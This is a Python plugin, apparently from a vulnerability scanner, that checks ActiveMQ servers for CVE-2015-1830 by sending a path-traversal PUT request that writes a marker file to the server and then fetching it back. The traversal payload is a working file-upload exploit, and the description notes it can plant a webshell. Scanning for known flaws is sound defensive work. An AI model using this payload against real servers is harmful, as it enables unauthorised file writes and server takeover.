import socket
import time
import random
from urllib import request


def get_plugin_info():
    plugin_info = {
        "name": "ActiveMQ Unauthenticated RCE",
        "info": "CVE-2015-1830，攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。",
        "level": "紧急",
        "type": "任意文件上传",
        "keyword": "ActiveMQ"
    }
    return plugin_info


def random_str(length):
    str1 = ""
    for i in range(length):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str1


def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        filename = random_str(6)
        flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nxxscan0\r\n\r\n" % (
            filename)
        s.send(flag)
        time.sleep(1)
        s.recv(1024)
        s.close()
        url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt' % filename
        res_html = request.urlopen(url, timeout=timeout).read(1024)
        if 'xxscan0' in res_html:
            return u"存在任意文件上传漏洞，" + url
    except Exception:
        pass
